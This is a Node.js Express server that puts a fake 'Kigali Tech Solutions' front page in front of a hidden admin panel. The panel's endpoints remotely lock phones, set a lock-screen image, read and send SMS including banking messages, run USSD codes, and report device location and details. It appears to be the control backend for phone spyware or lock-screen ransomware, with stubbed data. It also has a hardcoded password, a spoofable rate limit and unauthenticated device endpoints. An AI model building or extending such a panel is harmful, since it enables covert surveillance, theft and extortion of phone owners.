// server.js – Serves admin.html from public folder
const express = require('express');
const crypto = require('crypto');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

const SECRET_PATH = 'a9f3k217';
const ADMIN_USER = 'admin';
const ADMIN_PASS_HASH = crypto.createHash('sha256').update('yourpassword123').digest('hex');

const failedAttempts = {};

function getClientIP(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    return req.socket.remoteAddress || req.connection.remoteAddress;
}

app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// FAKE SITE
// ============================================================
app.get('/', (req, res) => {
    res.send(`
        <html>
        <head><title>Kigali Tech Solutions</title></head>
        <body style="background:#0a0e17;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
            <div>
                <h1 style="color:#4fc3f7;">🏎️ Kigali Tech Solutions</h1>
                <p style="color:#8896ab;">Innovating the future of racing technology.</p>
                <div style="position:fixed;bottom:10px;right:10px;font-size:8px;color:rgba(79,195,247,0.05);">ADMIN GRY</div>
            </div>
        </body>
        </html>
    `);
});

// ============================================================
// ADMIN DASHBOARD – serves from public/admin.html
// ============================================================
app.get('/a9f3k217', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// ============================================================
// LOGIN API
// ============================================================
app.post('/a9f3k217/api/login', (req, res) => {
    const ip = getClientIP(req);
    const now = Date.now();
    const blockDuration = 12 * 60 * 60 * 1000;

    if (failedAttempts[ip] && failedAttempts[ip].blockUntil > now) {
        return res.status(401).json({ remainingAttempts: 0 });
    }

    if (failedAttempts[ip] && failedAttempts[ip].blockUntil <= now) {
        delete failedAttempts[ip];
    }

    const { username, password } = req.body;
    const hash = crypto.createHash('sha256').update(password).digest('hex');
    const validUser = username === ADMIN_USER;
    const validPass = validUser && hash === ADMIN_PASS_HASH;

    if (validUser && validPass) {
        delete failedAttempts[ip];
        res.json({ success: true });
    } else {
        if (!failedAttempts[ip]) {
            failedAttempts[ip] = { count: 1, blockUntil: 0 };
        } else {
            failedAttempts[ip].count += 1;
        }

        const remaining = 5 - failedAttempts[ip].count;
        if (remaining <= 0) {
            failedAttempts[ip].blockUntil = now + blockDuration;
            res.status(401).json({ remainingAttempts: 0 });
        } else {
            res.status(401).json({ remainingAttempts: remaining });
        }
    }
});

// ============================================================
// DEVICE STATE (in-memory)
// ============================================================
let devices = {
    'device1': { name: 'Samsung S23', locked: false, battery: 85, online: true },
    'device2': { name: 'iPhone 15', locked: false, battery: 92, online: true },
    'device3': { name: 'Pixel 8', locked: true, battery: 67, online: false }
};
let lockScreenImage = null;

app.get('/a9f3k217/api/devices-lock', (req, res) => {
    res.json(devices);
});

app.post('/a9f3k217/api/lock-device', (req, res) => {
    const { deviceId, action } = req.body;
    if (!deviceId || !devices[deviceId]) {
        return res.status(404).json({ error: 'Device not found' });
    }
    if (action === 'lock') {
        devices[deviceId].locked = true;
        res.json({ success: true, message: 'Device locked' });
    } else if (action === 'unlock') {
        devices[deviceId].locked = false;
        res.json({ success: true, message: 'Device unlocked' });
    } else {
        res.status(400).json({ error: 'Invalid action' });
    }
});

app.post('/a9f3k217/api/lock-all', (req, res) => {
    Object.keys(devices).forEach(id => { devices[id].locked = true; });
    res.json({ success: true, message: 'All devices locked' });
});

app.post('/a9f3k217/api/unlock-all', (req, res) => {
    Object.keys(devices).forEach(id => { devices[id].locked = false; });
    res.json({ success: true, message: 'All devices unlocked' });
});

app.post('/a9f3k217/api/upload-lock-image', (req, res) => {
    const { image } = req.body;
    if (!image) {
        return res.status(400).json({ error: 'No image provided' });
    }
    lockScreenImage = image;
    res.json({ success: true, message: 'Lock screen image uploaded' });
});

// ============================================================
// SMS
// ============================================================
let smsMessages = [
    { number: '12345', body: 'Your account balance is 1,500 RWF', timestamp: Date.now() - 3600000 },
    { number: '1234', body: 'Data bundle: 2GB remaining', timestamp: Date.now() - 7200000 },
    { number: '98765', body: 'Your PIN has been changed successfully', timestamp: Date.now() - 86400000 }
];

app.get('/a9f3k217/api/sms', (req, res) => {
    res.json(smsMessages);
});

app.post('/a9f3k217/api/send-sms', (req, res) => {
    const { number, message } = req.body;
    if (!number || !message) {
        return res.status(400).json({ error: 'Number and message required' });
    }
    smsMessages.unshift({ number, body: message, timestamp: Date.now() });
    if (smsMessages.length > 100) smsMessages.pop();
    res.json({ success: true, message: 'SMS sent' });
});

// ============================================================
// USSD
// ============================================================
let ussdNumbers = [];

app.post('/a9f3k217/api/ussd', (req, res) => {
    const { code } = req.body;
    if (!code) return res.status(400).json({ error: 'No USSD code provided' });

    let responseMessage = '';
    if (code.includes('123')) responseMessage = 'Your account balance is 1,500 RWF. Validity: 7 days. Thank you.';
    else if (code.includes('131')) responseMessage = 'Data bundle: 2GB remaining. Expires on 2026-08-15.';
    else if (code.includes('144')) responseMessage = 'Airtime balance: 500 RWF. Bonus: 100 RWF.';
    else if (code.includes('200')) responseMessage = 'Welcome to Kigali Tech Services. Please select an option:\n1. Account Info\n2. Data Plans\n3. Support';
    else responseMessage = `USSD code ${code} executed. No further response available.`;

    const cleanNumber = code.replace(/\D/g, '');
    if (cleanNumber.length >= 4 && cleanNumber.length <= 5) {
        ussdNumbers.unshift({
            device: 'Sample Device',
            number: cleanNumber,
            type: 'USSD',
            timestamp: Date.now()
        });
        if (ussdNumbers.length > 100) ussdNumbers.pop();
    }

    res.json({ success: true, message: responseMessage });
});

app.get('/a9f3k217/api/ussd-numbers', (req, res) => res.json(ussdNumbers));
app.get('/a9f3k217/api/stats', (req, res) => {
    res.json({
        devices: 0,
        numbers: ussdNumbers.length,
        online: 0,
        ussd_count: ussdNumbers.length
    });
});
app.get('/a9f3k217/api/location', (req, res) => {
    res.json({
        lat: -1.9441,
        lng: 30.0619,
        accuracy: 15,
        time: new Date().toLocaleString()
    });
});
app.get('/a9f3k217/api/device-info', (req, res) => {
    res.json({
        model: 'Samsung Galaxy S23',
        manufacturer: 'Samsung',
        android_version: '14.0',
        battery: 76,
        storage: '128GB / 89GB used',
        device_id: 'abc123def456'
    });
});
app.get('/a9f3k217/api/devices', (req, res) => res.json([]));

// ============================================================
// 404
// ============================================================
app.use((req, res) => {
    res.status(404).send(`
        <html>
        <head><title>404</title></head>
        <body style="background:#0a0e17;color:#8896ab;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
            <h1 style="color:#4fc3f7;">404</h1>
            <p>Not found</p>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`✅ Dashboard running on port ${PORT}`);
    console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/a9f3k217`);
});
